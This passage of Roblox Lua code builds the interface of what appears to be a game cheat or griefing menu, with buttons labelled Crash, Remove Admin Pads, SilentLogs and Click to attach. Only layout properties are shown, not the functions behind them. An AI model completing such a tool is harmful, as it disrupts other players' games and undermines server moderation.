	CMDY.AntiAttach.Position = UDim2.new(0.839357436, 0, 0.381397843, 0)
	CMDY.AntiAttach.Size = UDim2.new(0, 33, 0, 15)

	CMDY.frfrfrfrfrfbb.Name = "frfrfrfrfrfbb"
	CMDY.frfrfrfrfrfbb.Parent = CMDY.AntiAttach

	CMDY.Toggle_8.Name = "Toggle"
	CMDY.Toggle_8.Parent = CMDY.AntiAttach
	CMDY.Toggle_8.BackgroundColor3 = Color3.fromRGB(255, 105, 105)
	CMDY.Toggle_8.Position = UDim2.new(-0.0222630501, 0, 0.0013936758, 0)
	CMDY.Toggle_8.Size = UDim2.new(0, 15, 0, 15)
	CMDY.Toggle_8.Font = Enum.Font.SourceSans
	CMDY.Toggle_8.Text = ""
	CMDY.Toggle_8.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Toggle_8.TextSize = 14.000

	CMDY.frfrfrfrfrfbbs.Name = "frfrfrfrfrfbbs"
	CMDY.frfrfrfrfrfbbs.Parent = CMDY.Toggle_8

	CMDY.ProteccServer.Name = "ProteccServer"
	CMDY.ProteccServer.Parent = CMDY.HomeP
	CMDY.ProteccServer.BackgroundColor3 = Color3.fromRGB(131, 131, 131)
	CMDY.ProteccServer.Position = UDim2.new(0.836345375, 0, 0.768064499, 0)
	CMDY.ProteccServer.Size = UDim2.new(0, 33, 0, 15)

	CMDY.frfrfrfrfrf_15.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_15.Parent = CMDY.ProteccServer

	CMDY.Toggle_4.Name = "Toggle"
	CMDY.Toggle_4.Parent = CMDY.ProteccServer
	CMDY.Toggle_4.BackgroundColor3 = Color3.fromRGB(255, 105, 105)
	CMDY.Toggle_4.Position = UDim2.new(-0.0222630501, 0, 0.0013936758, 0)
	CMDY.Toggle_4.Size = UDim2.new(0, 15, 0, 15)
	CMDY.Toggle_4.Font = Enum.Font.SourceSans
	CMDY.Toggle_4.Text = ""
	CMDY.Toggle_4.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Toggle_4.TextSize = 14.000

	CMDY.frfrfrfrfrf_16.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_16.Parent = CMDY.Toggle_4

	CMDY.Antikill2.Name = "Antikill2"
	CMDY.Antikill2.Parent = CMDY.HomeP
	CMDY.Antikill2.BackgroundColor3 = Color3.fromRGB(131, 131, 131)
	CMDY.Antikill2.Position = UDim2.new(0.839357436, 0, 0.511397839, 0)
	CMDY.Antikill2.Size = UDim2.new(0, 33, 0, 15)

	CMDY.frfrfrfrfrf_17.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_17.Parent = CMDY.Antikill2

	CMDY.Toggle_5.Name = "Toggle"
	CMDY.Toggle_5.Parent = CMDY.Antikill2
	CMDY.Toggle_5.BackgroundColor3 = Color3.fromRGB(255, 105, 105)
	CMDY.Toggle_5.Position = UDim2.new(-0.0222630501, 0, 0.0013936758, 0)
	CMDY.Toggle_5.Size = UDim2.new(0, 15, 0, 15)
	CMDY.Toggle_5.Font = Enum.Font.SourceSans
	CMDY.Toggle_5.Text = ""
	CMDY.Toggle_5.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Toggle_5.TextSize = 14.000

	CMDY.frfrfrfrfrf_18.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_18.Parent = CMDY.Toggle_5

	CMDY.Perm2.Name = "Perm2"
	CMDY.Perm2.Parent = CMDY.HomeP
	CMDY.Perm2.BackgroundColor3 = Color3.fromRGB(131, 131, 131)
	CMDY.Perm2.Position = UDim2.new(0.839357436, 0, 0.894731179, 0)
	CMDY.Perm2.Size = UDim2.new(0, 33, 0, 15)

	CMDY.frfrfrfrfrf_19.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_19.Parent = CMDY.Perm2

	CMDY.Toggle_6.Name = "Toggle"
	CMDY.Toggle_6.Parent = CMDY.Perm2
	CMDY.Toggle_6.BackgroundColor3 = Color3.fromRGB(255, 105, 105)
	CMDY.Toggle_6.Position = UDim2.new(-0.0222630501, 0, 0.0013936758, 0)
	CMDY.Toggle_6.Size = UDim2.new(0, 15, 0, 15)
	CMDY.Toggle_6.Font = Enum.Font.SourceSans
	CMDY.Toggle_6.Text = ""
	CMDY.Toggle_6.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Toggle_6.TextSize = 14.000

	CMDY.frfrfrfrfrf_20.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_20.Parent = CMDY.Toggle_6

	CMDY.Loopgrabi.Name = "Loopgrabi"
	CMDY.Loopgrabi.Parent = CMDY.HomeP
	CMDY.Loopgrabi.BackgroundColor3 = Color3.fromRGB(131, 131, 131)
	CMDY.Loopgrabi.Position = UDim2.new(0.839357436, 0, 0.251397848, 0)
	CMDY.Loopgrabi.Size = UDim2.new(0, 33, 0, 15)

	CMDY.frfrfrfrfrf_21.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_21.Parent = CMDY.Loopgrabi

	CMDY.Toggle_7.Name = "Toggle"
	CMDY.Toggle_7.Parent = CMDY.Loopgrabi
	CMDY.Toggle_7.BackgroundColor3 = Color3.fromRGB(255, 105, 105)
	CMDY.Toggle_7.Position = UDim2.new(-0.0222630501, 0, 0.0013936758, 0)
	CMDY.Toggle_7.Size = UDim2.new(0, 15, 0, 15)
	CMDY.Toggle_7.Font = Enum.Font.SourceSans
	CMDY.Toggle_7.Text = ""
	CMDY.Toggle_7.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.Toggle_7.TextSize = 14.000

	CMDY.frfrfrfrfrf_22.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_22.Parent = CMDY.Toggle_7

	CMDY.ObjectsP.Name = "ObjectsP"
	CMDY.ObjectsP.Parent = CMDY.TabsContainer
	CMDY.ObjectsP.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.ObjectsP.Position = UDim2.new(1.0830158, 0, 0.0613396689, 0)
	CMDY.ObjectsP.Size = UDim2.new(0, 332, 0, 294)
	CMDY.ObjectsP.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CMDY.ObjectsP.Visible = false

	CMDY.frfrfrfrfrf_23.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_23.Parent = CMDY.ObjectsP

	CMDY.ObjectsLabel.Name = "ObjectsLabel"
	CMDY.ObjectsLabel.Parent = CMDY.ObjectsP
	CMDY.ObjectsLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ObjectsLabel.BackgroundTransparency = 1.000
	CMDY.ObjectsLabel.Position = UDim2.new(0.315184563, 0, 0.000427559018, 0)
	CMDY.ObjectsLabel.Size = UDim2.new(0, 123, 0, 18)
	CMDY.ObjectsLabel.Font = Enum.Font.JosefinSans
	CMDY.ObjectsLabel.Text = "Objects"
	CMDY.ObjectsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ObjectsLabel.TextScaled = true
	CMDY.ObjectsLabel.TextSize = 14.000
	CMDY.ObjectsLabel.TextWrapped = true

	CMDY.FindRegen.Name = "FindRegen"
	CMDY.FindRegen.Parent = CMDY.ObjectsP
	CMDY.FindRegen.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.FindRegen.Position = UDim2.new(0.0451807231, 0, 0.123333335, 0)
	CMDY.FindRegen.Size = UDim2.new(0, 135, 0, 40)
	CMDY.FindRegen.Font = Enum.Font.JosefinSans
	CMDY.FindRegen.Text = "Find Regen Pad"
	CMDY.FindRegen.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.FindRegen.TextSize = 14.000
	CMDY.FindRegen.TextWrapped = true

	CMDY.frfrfrfrfrf_24.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_24.Parent = CMDY.FindRegen

	CMDY.FindPads.Name = "FindPads"
	CMDY.FindPads.Parent = CMDY.ObjectsP
	CMDY.FindPads.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.FindPads.Position = UDim2.new(0.548192799, 0, 0.123333335, 0)
	CMDY.FindPads.Size = UDim2.new(0, 135, 0, 40)
	CMDY.FindPads.Font = Enum.Font.JosefinSans
	CMDY.FindPads.Text = "Find Admin Pads"
	CMDY.FindPads.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.FindPads.TextSize = 14.000
	CMDY.FindPads.TextWrapped = true

	CMDY.frfrfrfrfrf_25.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_25.Parent = CMDY.FindPads

	CMDY.RemovePads.Name = "RemovePads"
	CMDY.RemovePads.Parent = CMDY.ObjectsP
	CMDY.RemovePads.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.RemovePads.Position = UDim2.new(0.55120486, 0, 0.283333331, 0)
	CMDY.RemovePads.Size = UDim2.new(0, 135, 0, 40)
	CMDY.RemovePads.Font = Enum.Font.JosefinSans
	CMDY.RemovePads.Text = "Remove Admin Pads"
	CMDY.RemovePads.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.RemovePads.TextSize = 14.000
	CMDY.RemovePads.TextWrapped = true

	CMDY.frfrfrfrfrf_26.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_26.Parent = CMDY.RemovePads

	CMDY.RemoveRegen.Name = "RemoveRegen"
	CMDY.RemoveRegen.Parent = CMDY.ObjectsP
	CMDY.RemoveRegen.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.RemoveRegen.Position = UDim2.new(0.0481927693, 0, 0.283333331, 0)
	CMDY.RemoveRegen.Size = UDim2.new(0, 135, 0, 40)
	CMDY.RemoveRegen.Font = Enum.Font.JosefinSans
	CMDY.RemoveRegen.Text = "Remove Regen Pad"
	CMDY.RemoveRegen.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.RemoveRegen.TextSize = 14.000
	CMDY.RemoveRegen.TextWrapped = true

	CMDY.frfrfrfrfrf_27.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_27.Parent = CMDY.RemoveRegen

	CMDY.RemoveObby.Name = "RemoveObby"
	CMDY.RemoveObby.Parent = CMDY.ObjectsP
	CMDY.RemoveObby.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.RemoveObby.Position = UDim2.new(0.0480000004, 0, 0.442999989, 0)
	CMDY.RemoveObby.Size = UDim2.new(0, 135, 0, 40)
	CMDY.RemoveObby.Font = Enum.Font.JosefinSans
	CMDY.RemoveObby.Text = "Remove Obby"
	CMDY.RemoveObby.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.RemoveObby.TextSize = 14.000
	CMDY.RemoveObby.TextWrapped = true

	CMDY.frfrfrfrfrf_28.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_28.Parent = CMDY.RemoveObby

	CMDY.RemoveBaseplate.Name = "RemoveBaseplate"
	CMDY.RemoveBaseplate.Parent = CMDY.ObjectsP
	CMDY.RemoveBaseplate.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.RemoveBaseplate.Position = UDim2.new(0.550999999, 0, 0.442999989, 0)
	CMDY.RemoveBaseplate.Size = UDim2.new(0, 135, 0, 40)
	CMDY.RemoveBaseplate.Font = Enum.Font.JosefinSans
	CMDY.RemoveBaseplate.Text = "Remove Baseplate"
	CMDY.RemoveBaseplate.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.RemoveBaseplate.TextSize = 14.000
	CMDY.RemoveBaseplate.TextWrapped = true

	CMDY.frfrfrfrfrf_29.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_29.Parent = CMDY.RemoveBaseplate

	CMDY.BringRegen.Name = "BringRegen"
	CMDY.BringRegen.Parent = CMDY.ObjectsP
	CMDY.BringRegen.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.BringRegen.Position = UDim2.new(0.0480000004, 0, 0.602999985, 0)
	CMDY.BringRegen.Size = UDim2.new(0, 135, 0, 40)
	CMDY.BringRegen.Font = Enum.Font.JosefinSans
	CMDY.BringRegen.Text = "Fix Regen Pad"
	CMDY.BringRegen.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.BringRegen.TextSize = 14.000
	CMDY.BringRegen.TextWrapped = true

	CMDY.frfrfrfrfrf_30.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_30.Parent = CMDY.BringRegen

	CMDY.BringPads.Name = "BringPads"
	CMDY.BringPads.Parent = CMDY.ObjectsP
	CMDY.BringPads.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.BringPads.Position = UDim2.new(0.550999999, 0, 0.602999985, 0)
	CMDY.BringPads.Size = UDim2.new(0, 135, 0, 40)
	CMDY.BringPads.Font = Enum.Font.JosefinSans
	CMDY.BringPads.Text = "Fix Admin Pads"
	CMDY.BringPads.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.BringPads.TextSize = 14.000
	CMDY.BringPads.TextWrapped = true

	CMDY.frfrfrfrfrf_31.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_31.Parent = CMDY.BringPads

	CMDY.BringObby.Name = "BringObby"
	CMDY.BringObby.Parent = CMDY.ObjectsP
	CMDY.BringObby.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.BringObby.Position = UDim2.new(0.0480000004, 0, 0.766333342, 0)
	CMDY.BringObby.Size = UDim2.new(0, 135, 0, 40)
	CMDY.BringObby.Font = Enum.Font.JosefinSans
	CMDY.BringObby.Text = "Fix Obby"
	CMDY.BringObby.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.BringObby.TextSize = 14.000
	CMDY.BringObby.TextWrapped = true

	CMDY.frfrfrfrfrf_32.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_32.Parent = CMDY.BringObby

	CMDY.BringBaseplate.Name = "BringBaseplate"
	CMDY.BringBaseplate.Parent = CMDY.ObjectsP
	CMDY.BringBaseplate.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.BringBaseplate.Position = UDim2.new(0.550999999, 0, 0.766333342, 0)
	CMDY.BringBaseplate.Size = UDim2.new(0, 135, 0, 40)
	CMDY.BringBaseplate.Font = Enum.Font.JosefinSans
	CMDY.BringBaseplate.Text = "Fix Baseplate"
	CMDY.BringBaseplate.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.BringBaseplate.TextSize = 14.000
	CMDY.BringBaseplate.TextWrapped = true

	CMDY.frfrfrfrfrf_33.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_33.Parent = CMDY.BringBaseplate

	CMDY.TeleportsP.Name = "TeleportsP"
	CMDY.TeleportsP.Parent = CMDY.TabsContainer
	CMDY.TeleportsP.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.TeleportsP.Position = UDim2.new(1.0830158, 0, 0.0613396689, 0)
	CMDY.TeleportsP.Size = UDim2.new(0, 332, 0, 294)
	CMDY.TeleportsP.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CMDY.TeleportsP.Visible = false

	CMDY.frfrfrfrfrf_34.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_34.Parent = CMDY.TeleportsP

	CMDY.TeleportsLabel.Name = "TeleportsLabel"
	CMDY.TeleportsLabel.Parent = CMDY.TeleportsP
	CMDY.TeleportsLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TeleportsLabel.BackgroundTransparency = 1.000
	CMDY.TeleportsLabel.Position = UDim2.new(0.315184563, 0, 0.000427559018, 0)
	CMDY.TeleportsLabel.Size = UDim2.new(0, 123, 0, 18)
	CMDY.TeleportsLabel.Font = Enum.Font.JosefinSans
	CMDY.TeleportsLabel.Text = "Teleports"
	CMDY.TeleportsLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TeleportsLabel.TextScaled = true
	CMDY.TeleportsLabel.TextSize = 14.000
	CMDY.TeleportsLabel.TextWrapped = true

	CMDY.House.Name = "House"
	CMDY.House.Parent = CMDY.TeleportsP
	CMDY.House.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.House.Position = UDim2.new(0.0419638604, 0, 0.0749523863, 0)
	CMDY.House.Size = UDim2.new(0, 135, 0, 40)
	CMDY.House.Font = Enum.Font.JosefinSans
	CMDY.House.Text = "House"
	CMDY.House.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.House.TextSize = 14.000
	CMDY.House.TextWrapped = true

	CMDY.frfrfrfrfrf_35.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_35.Parent = CMDY.House

	CMDY.AdminPads.Name = "AdminPads"
	CMDY.AdminPads.Parent = CMDY.TeleportsP
	CMDY.AdminPads.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.AdminPads.Position = UDim2.new(0.544975877, 0, 0.0749523863, 0)
	CMDY.AdminPads.Size = UDim2.new(0, 135, 0, 40)
	CMDY.AdminPads.Font = Enum.Font.JosefinSans
	CMDY.AdminPads.Text = "Admin Pads"
	CMDY.AdminPads.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.AdminPads.TextSize = 14.000
	CMDY.AdminPads.TextWrapped = true

	CMDY.frfrfrfrfrf_36.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_36.Parent = CMDY.AdminPads

	CMDY.RegenPad.Name = "RegenPad"
	CMDY.RegenPad.Parent = CMDY.TeleportsP
	CMDY.RegenPad.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.RegenPad.Position = UDim2.new(0.0449758768, 0, 0.247061193, 0)
	CMDY.RegenPad.Size = UDim2.new(0, 135, 0, 40)
	CMDY.RegenPad.Font = Enum.Font.JosefinSans
	CMDY.RegenPad.Text = "Regen Pad"
	CMDY.RegenPad.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.RegenPad.TextSize = 14.000
	CMDY.RegenPad.TextWrapped = true

	CMDY.frfrfrfrfrf_37.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_37.Parent = CMDY.RegenPad

	CMDY.Spawn.Name = "Spawn"
	CMDY.Spawn.Parent = CMDY.TeleportsP
	CMDY.Spawn.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.Spawn.Position = UDim2.new(0.547987938, 0, 0.247061193, 0)
	CMDY.Spawn.Size = UDim2.new(0, 135, 0, 40)
	CMDY.Spawn.Font = Enum.Font.JosefinSans
	CMDY.Spawn.Text = "Spawn"
	CMDY.Spawn.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Spawn.TextSize = 14.000
	CMDY.Spawn.TextWrapped = true

	CMDY.AddCommand.Name = "AddCommand"
	CMDY.AddCommand.Parent = CMDY.CommandsP
	CMDY.AddCommand.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
	CMDY.AddCommand.Position = UDim2.new(0.307228923, 0, 0.880952358, 0)
	CMDY.AddCommand.Size = UDim2.new(0, 128, 0, 35)
	CMDY.AddCommand.Font = Enum.Font.Highway
	CMDY.AddCommand.Text = "ADD COMMAND"
	CMDY.AddCommand.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.AddCommand.TextSize = 20.000
	CMDY.AddCommand.TextWrapped = true
	CMDY.AddCommand.Visible = true

	CMDY.UICorner23232323.CornerRadius = UDim.new(20, 20)
	CMDY.UICorner23232323.Parent = CMDY.AddCommand

	CMDY.frfrfrfrfrf_38.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_38.Parent = CMDY.Spawn

	CMDY.SpawnBind.Name = "SpawnBind"
	CMDY.SpawnBind.Parent = CMDY.TeleportsP
	CMDY.SpawnBind.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
	CMDY.SpawnBind.Position = UDim2.new(0.343373477, 0, 0.518140197, 0)
	CMDY.SpawnBind.Size = UDim2.new(0, 47, 0, 26)
	CMDY.SpawnBind.Font = Enum.Font.SourceSans
	CMDY.SpawnBind.PlaceholderText = "V"
	CMDY.SpawnBind.Text = ""
	CMDY.SpawnBind.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.SpawnBind.TextSize = 14.000

	CMDY.UICorner_9.Parent = CMDY.SpawnBind

	CMDY.HouseBind.Name = "HouseBind"
	CMDY.HouseBind.Parent = CMDY.TeleportsP
	CMDY.HouseBind.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
	CMDY.HouseBind.Position = UDim2.new(0.343373477, 0, 0.411564618, 0)
	CMDY.HouseBind.Size = UDim2.new(0, 47, 0, 25)
	CMDY.HouseBind.Font = Enum.Font.SourceSans
	CMDY.HouseBind.PlaceholderText = "C"
	CMDY.HouseBind.Text = ""
	CMDY.HouseBind.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.HouseBind.TextSize = 14.000

	CMDY.UICorner_10.Parent = CMDY.HouseBind

	CMDY.TextLabel.Parent = CMDY.TeleportsP
	CMDY.TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel.BackgroundTransparency = 1.000
	CMDY.TextLabel.Position = UDim2.new(0.0421686769, 0, 0.517006695, 0)
	CMDY.TextLabel.Size = UDim2.new(0, 89, 0, 27)
	CMDY.TextLabel.Font = Enum.Font.SourceSans
	CMDY.TextLabel.Text = "Spawn Bind:"
	CMDY.TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel.TextScaled = true
	CMDY.TextLabel.TextSize = 14.000
	CMDY.TextLabel.TextWrapped = true

	CMDY.TextLabel_2.Parent = CMDY.TeleportsP
	CMDY.TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_2.BackgroundTransparency = 1.000
	CMDY.TextLabel_2.Position = UDim2.new(0.0572289079, 0, 0.411564618, 0)
	CMDY.TextLabel_2.Size = UDim2.new(0, 88, 0, 25)
	CMDY.TextLabel_2.Font = Enum.Font.SourceSans
	CMDY.TextLabel_2.Text = "House Bind:"
	CMDY.TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_2.TextScaled = true
	CMDY.TextLabel_2.TextSize = 14.000
	CMDY.TextLabel_2.TextWrapped = true

	CMDY.TextLabel_3.Parent = CMDY.TeleportsP
	CMDY.TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_3.BackgroundTransparency = 1.000
	CMDY.TextLabel_3.Position = UDim2.new(0.539156616, 0, 0.411564618, 0)
	CMDY.TextLabel_3.Size = UDim2.new(0, 88, 0, 25)
	CMDY.TextLabel_3.Font = Enum.Font.SourceSans
	CMDY.TextLabel_3.Text = "Regen Pad Bind:"
	CMDY.TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_3.TextScaled = true
	CMDY.TextLabel_3.TextSize = 14.000
	CMDY.TextLabel_3.TextWrapped = true

	CMDY.TextLabel_4.Parent = CMDY.TeleportsP
	CMDY.TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_4.BackgroundTransparency = 1.000
	CMDY.TextLabel_4.Position = UDim2.new(0.52409637, 0, 0.517006695, 0)
	CMDY.TextLabel_4.Size = UDim2.new(0, 89, 0, 27)
	CMDY.TextLabel_4.Font = Enum.Font.SourceSans
	CMDY.TextLabel_4.Text = "Admin Pads Bind:"
	CMDY.TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.TextLabel_4.TextScaled = true
	CMDY.TextLabel_4.TextSize = 14.000
	CMDY.TextLabel_4.TextWrapped = true

	CMDY.AdminPadsBind.Name = "AdminPadsBind"
	CMDY.AdminPadsBind.Parent = CMDY.TeleportsP
	CMDY.AdminPadsBind.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
	CMDY.AdminPadsBind.Position = UDim2.new(0.82530117, 0, 0.518140197, 0)
	CMDY.AdminPadsBind.Size = UDim2.new(0, 47, 0, 26)
	CMDY.AdminPadsBind.Font = Enum.Font.SourceSans
	CMDY.AdminPadsBind.PlaceholderText = "F"
	CMDY.AdminPadsBind.Text = ""
	CMDY.AdminPadsBind.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.AdminPadsBind.TextSize = 14.000

	CMDY.UICorner_11.Parent = CMDY.AdminPadsBind

	CMDY.RegenPadBind.Name = "RegenPadBind"
	CMDY.RegenPadBind.Parent = CMDY.TeleportsP
	CMDY.RegenPadBind.BackgroundColor3 = Color3.fromRGB(89, 89, 89)
	CMDY.RegenPadBind.Position = UDim2.new(0.82530117, 0, 0.411564618, 0)
	CMDY.RegenPadBind.Size = UDim2.new(0, 47, 0, 25)
	CMDY.RegenPadBind.Font = Enum.Font.SourceSans
	CMDY.RegenPadBind.PlaceholderText = "R"
	CMDY.RegenPadBind.Text = ""
	CMDY.RegenPadBind.TextColor3 = Color3.fromRGB(0, 0, 0)
	CMDY.RegenPadBind.TextSize = 14.000

	CMDY.UICorner_12.Parent = CMDY.RegenPadBind

	CMDY.MiscP.Name = "MiscP"
	CMDY.MiscP.Parent = CMDY.TabsContainer
	CMDY.MiscP.BackgroundColor3 = Color3.fromRGB(26, 26, 26)
	CMDY.MiscP.Position = UDim2.new(1.0830158, 0, 0.0613396689, 0)
	CMDY.MiscP.Size = UDim2.new(0, 332, 0, 294)
	CMDY.MiscP.SizeConstraint = Enum.SizeConstraint.RelativeYY
	CMDY.MiscP.Visible = false

	CMDY.frfrfrfrfrf_39.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_39.Parent = CMDY.MiscP

	CMDY.MiscLabel.Name = "MiscLabel"
	CMDY.MiscLabel.Parent = CMDY.MiscP
	CMDY.MiscLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.MiscLabel.BackgroundTransparency = 1.000
	CMDY.MiscLabel.Position = UDim2.new(0.315184563, 0, 0.000427559018, 0)
	CMDY.MiscLabel.Size = UDim2.new(0, 123, 0, 18)
	CMDY.MiscLabel.Font = Enum.Font.JosefinSans
	CMDY.MiscLabel.Text = "Misc"
	CMDY.MiscLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.MiscLabel.TextScaled = true
	CMDY.MiscLabel.TextSize = 14.000
	CMDY.MiscLabel.TextWrapped = true

	CMDY.Crash.Name = "Crash"
	CMDY.Crash.Parent = CMDY.MiscP
	CMDY.Crash.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.Crash.Position = UDim2.new(0.0449758768, 0, 0.0968638957, 0)
	CMDY.Crash.Size = UDim2.new(0, 135, 0, 40)
	CMDY.Crash.Font = Enum.Font.JosefinSans
	CMDY.Crash.Text = "Crash"
	CMDY.Crash.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.Crash.TextSize = 14.000
	CMDY.Crash.TextWrapped = true

	CMDY.frfrfrfrfrf_40.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_40.Parent = CMDY.Crash

	CMDY.ForceRespawn.Name = "ForceRespawn"
	CMDY.ForceRespawn.Parent = CMDY.MiscP
	CMDY.ForceRespawn.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.ForceRespawn.Position = UDim2.new(0.544975877, 0, 0.0967414975, 0)
	CMDY.ForceRespawn.Size = UDim2.new(0, 135, 0, 40)
	CMDY.ForceRespawn.Font = Enum.Font.JosefinSans
	CMDY.ForceRespawn.Text = "Force Respawn"
	CMDY.ForceRespawn.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ForceRespawn.TextSize = 14.000
	CMDY.ForceRespawn.TextWrapped = true

	CMDY.frfrfrfrfrf_41.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_41.Parent = CMDY.ForceRespawn

	CMDY.ClickToAttach.Name = "ClickToAttach"
	CMDY.ClickToAttach.Parent = CMDY.MiscP
	CMDY.ClickToAttach.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.ClickToAttach.Position = UDim2.new(0.0449758768, 0, 0.270210892, 0)
	CMDY.ClickToAttach.Size = UDim2.new(0, 135, 0, 40)
	CMDY.ClickToAttach.Font = Enum.Font.JosefinSans
	CMDY.ClickToAttach.Text = "Click to attach"
	CMDY.ClickToAttach.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.ClickToAttach.TextSize = 14.000
	CMDY.ClickToAttach.TextWrapped = true

	CMDY.frfrfrfrfrf_42.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_42.Parent = CMDY.ClickToAttach

	CMDY.SilentLogs.Name = "SilentLogs"
	CMDY.SilentLogs.Parent = CMDY.MiscP
	CMDY.SilentLogs.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.SilentLogs.Position = UDim2.new(0.544975877, 0, 0.266809523, 0)
	CMDY.SilentLogs.Size = UDim2.new(0, 135, 0, 40)
	CMDY.SilentLogs.Font = Enum.Font.JosefinSans
	CMDY.SilentLogs.Text = "SilentLogs"
	CMDY.SilentLogs.TextColor3 = Color3.fromRGB(255, 255, 255)
	CMDY.SilentLogs.TextSize = 14.000
	CMDY.SilentLogs.TextWrapped = true

	CMDY.frfrfrfrfrf_43.Name = "frfrfrfrfrf"
	CMDY.frfrfrfrfrf_43.Parent = CMDY.SilentLogs

	CMDY.FixColors.Name = "FixColors"
	CMDY.FixColors.Parent = CMDY.MiscP
	CMDY.FixColors.BackgroundColor3 = Color3.fromRGB(48, 48, 48)
	CMDY.FixColors.Position = UDim2.new(0.0449758768, 0, 0.443680286, 0)
	CMDY.FixColors.Size = UDim2.new(0, 135, 0, 40)
	CMDY.FixColors.Font = Enum.Font.JosefinSans
	CMDY.FixColors.Text = "Fix Colors"
